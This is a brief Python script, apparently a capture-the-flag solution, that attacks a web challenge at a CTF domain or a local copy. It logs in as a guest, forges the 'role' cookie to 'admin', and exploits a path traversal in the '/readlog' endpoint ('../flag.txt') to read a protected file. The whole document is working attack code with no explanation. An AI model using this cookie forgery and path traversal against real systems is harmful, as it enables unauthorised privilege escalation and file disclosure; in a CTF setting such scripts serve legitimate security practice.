import sys
import requests

session = requests.session()

if len(sys.argv) > 1 and sys.argv[1] == "local":
    HOST = "http://127.0.0.1:8000"
else:
    HOST = "http://learning.web.jeanne-hack-ctf.org"

# Authenticate
burp0_url = HOST + "/login"
burp0_headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
burp0_data = {"username": "guest", "password": "password"}
session.post(burp0_url, headers=burp0_headers, data=burp0_data)

# Add admin cookie
session.cookies["role"] = None
session.cookies["role"] = "admin"

# Get the flag
burp0_url = HOST + "/readlog?logfile=../flag.txt"
burp0_headers = {"User-Agent": "Mozilla/5.0"}
resp = session.get(burp0_url, headers=burp0_headers, allow_redirects=False)

print(resp.text)
